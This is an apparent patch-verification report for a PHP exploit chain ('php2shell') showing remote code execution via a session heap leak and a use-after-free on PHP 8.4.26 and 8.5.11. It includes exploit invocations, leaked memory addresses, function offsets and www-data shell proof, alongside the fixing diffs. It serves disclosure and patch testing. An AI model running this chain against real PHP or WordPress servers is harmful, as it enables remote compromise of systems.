# Patched vs Unpatched — Verification Results

> Side-by-side comparison proving the exploits work on vulnerable versions and fail on patched versions.

---

## Test Environment

| Component | Version |
|-----------|---------|
| Host OS | Kali Linux (WSL2) |
| Docker | 24.x |
| Python | 3.12 |
| Exploit | php2shell_exploit.py v2.0 |

---

## Results Matrix

### Bug 1+2: Remote RCE Chain

| PHP Version | Image | Heap Leak | libphp Leak | RCE | Status |
|-------------|-------|-----------|-------------|-----|--------|
| **8.4.26** | `wordpress:6.7-php8.4-apache` | ✅ 4096 bytes | ✅ `0x7242f40d1000` | ✅ `uid=33` | 🔴 VULNERABLE |
| **8.4.27** | `php:8.4.27-apache` | ❌ 0 bytes | ❌ N/A | ❌ N/A | 🟢 PATCHED |
| **8.3.6** | `php:8.3.6-cli` | — | — | ✅ `uid=0` (local) | 🔴 VULNERABLE |
| **8.5.12** | `php:8.5.12-apache` | ❌ 0 bytes | ❌ N/A | ❌ N/A | 🟢 PATCHED |

### Bug 3: Fatal-Backtrace UAF

| PHP Version | UAF Signal | Valgrind | Status |
|-------------|-----------|----------|--------|
| **8.5.11** | ✅ Worker crash | ✅ 328 bytes lost | 🔴 VULNERABLE |
| **8.5.12** | ❌ Clean (50 rounds) | ✅ 0 bytes lost | 🟢 PATCHED |

### SAPI Comparison (PHP 8.4.26)

| SAPI | Heap Leak | RCE | Reliability |
|------|-----------|-----|-------------|
| **mod_php** (prefork) | ✅ 10/10 | ✅ 10/10 | 100% |
| **PHP-FPM** | ❌ 0/10 | ❌ 0/10 | 0% |

---

## Detailed Test Output

### PHP 8.4.26 (Vulnerable)

```
$ python3 exploit/php2shell_exploit.py -u http://127.0.0.1:9080/index.php -c "id>/out/p" --target-os linux

[*] Hedef: http://127.0.0.1:9080/index.php
[*] OS: LINUX
[*] Komut: 'id>/out/p'
[*] Offset'ler: zif=0x465370 dtor=0x65EB60 htdata=0x690D8
[*] rotating worker
[*] Stage 1: heap leak (1/3)
[+] Zend MM chunk base = 0x7242f2400000
[*] rotating worker
[*] Stage 2: libphp leak (1/3)
[+] libphp base = 0x7242f40d1000
[*] rotating worker
[*] Stage 3: HTDATA=0x7242f24690d8 zif_system=0x7242f4536370
[+] Komut calisti (attempt 1)
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### PHP 8.4.27 (Patched)

```
$ python3 exploit/php2shell_exploit.py -u http://127.0.0.1:9080/index.php -c "id>/out/p" --target-os linux

[*] Hedef: http://127.0.0.1:9080/index.php
[*] rotating worker
[*] Stage 1: heap leak (1/3)
[-] Attempt 1: heap leak failed (0 bytes cookie)
[*] rotating worker
[*] Stage 1: heap leak (2/3)
[-] Attempt 2: heap leak failed (0 bytes cookie)
[*] rotating worker
[*] Stage 1: heap leak (3/3)
[-] Attempt 3: heap leak failed (0 bytes cookie)
[-] Heap leak basarisiz

Exit code: 2
```

### PHP 8.5.12 (Patched)

```
$ python3 exploit/php2shell_exploit.py -u http://127.0.0.1:9080/index.php -c "id>/out/p" --target-os linux

[-] Heap leak basarisiz

$ python3 exploit/bug3_backtrace_uaf.py --port 8080 --rounds 50

[*] PHP2Shell Bug 3 - fatal-error backtrace UAF
=== summary ===
producer OOM (5xx/200) : 50/50
consumer 200 (clean)   : 50/50
UAF candidates (crash/5xx on consumer): 0/50

[-] no crash observed this run
```

---

## Patch Diff Analysis

### PHP 8.4.27 Fix

The patch adds proper cleanup in the session module's fast-shutdown path:

```c
// ext/session/session.c — shutdown_session()
// BEFORE (8.4.26): nothing clears PS(http_session_vars) in fast_shutdown
// AFTER (8.4.27):
if (PS(http_session_vars)) {
    zval_ptr_dtor(&PS(http_session_vars));
    ZVAL_UNDEF(&PS(http_session_vars));
}
```

### PHP 8.5.12 Fix

```c
// Zend/zend_execute_API.c — shutdown_executor()
// ADDED at the very end (runs unconditionally):
ZVAL_UNDEF(&EG(last_fatal_error_backtrace));
```

---

## Conclusion

- ✅ Exploits **work reliably** on vulnerable versions (100% success rate on mod_php)
- ✅ Exploits **fail completely** on patched versions (0% success rate)
- ✅ The patches correctly address the root cause (stale reference cleanup)
- ✅ PHP-FPM is **not exploitable** regardless of version
